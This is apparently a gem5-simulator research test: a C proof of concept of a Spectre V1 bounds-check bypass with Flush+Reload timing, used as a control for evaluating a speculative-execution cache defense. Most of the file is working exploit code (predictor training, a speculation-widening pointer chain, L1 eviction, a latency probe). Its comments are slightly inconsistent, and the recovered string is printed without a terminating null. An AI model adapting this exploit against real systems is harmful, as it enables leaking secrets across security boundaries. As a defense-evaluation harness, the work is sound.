/*
 * Spectre V1 (bounds-check bypass) against the L1 data cache, for gem5 SE mode.
 *
 * Purpose
 * -------
 * flop_attack and flop_attack_v2 close the leak using the Load Value Predictor:
 * the branch on a loaded value is resolved from a prediction, so the CPU
 * proceeds past a data dependency it has not yet satisfied.
 *
 * This attack does not use the LVP at all.  It relies only on the ordinary
 * branch predictor mispredicting a secret-dependent bounds check, which is the
 * original Spectre V1.  That makes it the control that matters for two reasons:
 *
 *   1. It separates the cache mechanism from the predictor.  If SpaceSpec closes
 *      this leak too, then what protects the cache is the cache mechanism, and
 *      not some interaction with the LVP.
 *
 *   2. It is the case SafeSpec is actually about.  The leaking load belongs to
 *      an instruction that is squashed, because the branch it depends on was
 *      mispredicted.  Wait-for-commit means a squashed load's line is discarded
 *      rather than installed, so the secret-indexed line never becomes resident
 *      and there is nothing for a Flush+Reload probe to find.
 *
 * The attack
 * ----------
 *   probe_area   256 lines, in L1 throughout.  This is the array the attacker
 *                probes and the victim's array at the same time.
 *   victim(i)    a bounds check on a secret i, then probe_area[i * LINE_SIZE].
 *
 * The branch predictor is trained to expect "in bounds".  The attacker then
 * supplies an out-of-bounds secret, the predictor is wrong, and the load runs
 * and is then squashed.  Crucially the memory access has already happened by the
 * time the squash occurs, so the line is fetched -- it is only the instruction
 * that dies.
 *
 * Pass condition
 * --------------
 * Not output equivalence.  The signal is a timing measurement, so the correct
 * comparison is between configurations:
 *
 *   LVP off, SpaceSpec off   expect LEAK      (branch predictor alone suffices)
 *   LVP off, SpaceSpec on    expect NO-LEAK   (this is the claim under test)
 *   LVP on,  SpaceSpec off   expect LEAK      (sanity: flop_attack still works)
 *
 * "rec" is the recovered string.  A run where every round is '?' is a closed
 * leak; a run that spells the secret is an open one.
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define LINE_SIZE    64
#define PROBE_SIZE   (256 * LINE_SIZE)
#define TRAIN_ITERS  4000
#define THRESHOLD    40
#define FLUSH_BUF_SIZE (192 * 1024)

/*
 * The victim will only ever be called with in-bounds values during training, so
 * the predictor learns "in bounds".  The attack index is well outside this.
 */
#define VICTIM_BOUNDS 64

/* The secret the attacker wants: which line the victim speculatively touches. */
#define SECRET 0xEE

/* Shared with the victim; volatile so the compiler cannot constant-fold it. */
static volatile uint32_t idx_var;

/* The attacker-observable region. Also the victim's out-of-bounds target. */
static uint8_t probe_area[PROBE_SIZE];

/* Touched to evict L1 between rounds. */
static uint8_t flush_buf[FLUSH_BUF_SIZE];

/*
 * A chain of dependent loads used to delay the resolution of the bounds check.
 *
 * This is what makes the attack work at all, and getting it wrong is the whole
 * difficulty.  The bounds condition and the leaked address must not depend on
 * the same value: if they do, the branch resolves and the leaked load becomes
 * addressable at about the same moment, and the branch usually wins the race,
 * so the load never issues and nothing leaks.
 *
 * flop_attack escapes this only because the LVP supplies the secret-derived
 * value instantly, which is why it does not leak once the LVP is disabled.
 *
 * Here the bounds condition is a walk down a pointer chain -- CHAIN_LEN
 * dependent L1 hits, hundreds of cycles -- while the leaked address depends
 * only on a parameter that is ready on arrival.  The load therefore issues long
 * before the CPU learns which way the branch went.
 */
#define CHAIN_LEN 64
static uint32_t chain[256];

static inline uint64_t
rdcycle(void)
{
    uint64_t c;
    asm volatile("csrrs %0, cycle, x0" : "=r"(c) :: "memory");
    return c;
}

static void
flush_all_l1(void)
{
    volatile uint8_t *fb = flush_buf;
    for (int i = 0; i < FLUSH_BUF_SIZE; i += LINE_SIZE) {
        fb[i] += 1;
    }
}

/*
 * The victim.
 *
 * Deliberately noinline, and nothing here is compile-time constant.  The branch
 * is a bounds check whose condition is secret-dependent; the body performs a
 * load whose address is also secret-dependent.  The predictor is trained to
 * expect the bounds check to pass.
 */
__attribute__((noinline))
static void
victim(uint32_t secret)
{
    /* Slow to resolve, and does not depend on the secret. */
    uint32_t c = 0;
    for (int k = 0; k < CHAIN_LEN; k++) {
        c = chain[c];
    }

    if (c < VICTIM_BOUNDS) {
        /* Fast to issue: the address is ready before the branch resolves. */
        uint8_t v = probe_area[(size_t)secret * LINE_SIZE];
        /* Consume the value so the access cannot be eliminated. */
        if (v == 0xFF) {
            idx_var = v;
        }
    }
}

int
main(void)
{
    printf("spectre_v1 start  (secret line=%d, bounds=%d)\n",
           SECRET, VICTIM_BOUNDS);

    for (int i = 0; i < 256; i++) {
        probe_area[i * LINE_SIZE] = (uint8_t)i;
        chain[i] = i;
    }

    char recovered[8];
    int hits = 0;

    for (int round = 0; round < 4; round++) {
        /*
         * Train: the chain lands on 0, which is in bounds, so the predictor
         * learns that the bounds check passes.
         */
        chain[0] = 0;
        for (int i = 0; i < TRAIN_ITERS; i++) {
            victim(round);
        }

        /*
         * Attack: the chain now lands outside the bounds, so the check really
         * does fail, but the predictor still expects it to pass.
         */
        chain[0] = 0xC8;    /* 200, out of bounds */
        chain[0xC8] = 0xC8; /* and it stays there */

        /* Evict probe_area from L1 so a later hit is attributable. */
        flush_all_l1();

        /* The mispredicted load brings probe_area[SECRET*64] into L1. */
        victim(SECRET);

        /* Restore, so the next round trains from a known state. */
        chain[0] = 0;

        /*
         * Flush+Reload: whichever line is now fastest in L1 is the one the
         * victim speculatively touched.
         */
        uint64_t min_lat = ~0ULL;
        int leak = -1;
        for (int b = 0; b < 256; b++) {
            volatile uint8_t *line = probe_area + b * LINE_SIZE;
            uint64_t c1 = rdcycle();
            uint8_t v = *line;
            asm volatile("" : "+r"(v) : : "memory");
            uint64_t c2 = rdcycle();
            uint64_t d = c2 - c1;
            if (d < min_lat) {
                min_lat = d;
                leak = b;
            }
        }

        int got = (min_lat < THRESHOLD && leak == SECRET);
        hits += got;
        recovered[round] = got ? (char)leak : '?';

        printf("round %d: secret=0x%02x leaked=0x%02x min_lat=%llu  [%s]\n",
               round, SECRET, (leak >= 0) ? leak : 0,
               (unsigned long long)min_lat,
               got ? "LEAK" : "NO-LEAK");
    }

    printf("spectre_v1 rec \"%s\"  hits=%d/4  verdict=%s\n",
           recovered, hits, hits ? "LEAK" : "NO-LEAK");

    return 0;
}
